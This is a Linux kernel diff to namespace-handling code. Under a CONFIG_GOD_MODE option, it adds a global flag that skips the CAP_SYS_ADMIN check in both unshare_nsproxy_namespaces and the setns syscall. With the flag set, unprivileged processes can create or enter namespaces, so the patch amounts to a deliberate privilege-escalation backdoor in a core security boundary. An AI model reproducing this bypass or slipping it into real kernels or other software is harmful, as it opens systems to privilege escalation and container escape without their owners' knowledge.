@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  Copyright (C) 2006 IBM Corporation
  *
@@ -192,7 +195,15 @@ int unshare_nsproxy_namespaces(unsigned long unshare_flags,
 		return 0;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	*new_nsp = create_new_namespaces(unshare_flags, current,
 				new_fs ? new_fs : current->fs);
@@ -242,7 +253,15 @@ SYSCALL_DEFINE2(setns, int, fd, int, nstype)
 	int err;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	file = proc_ns_fget(fd);
 	if (IS_ERR(file))
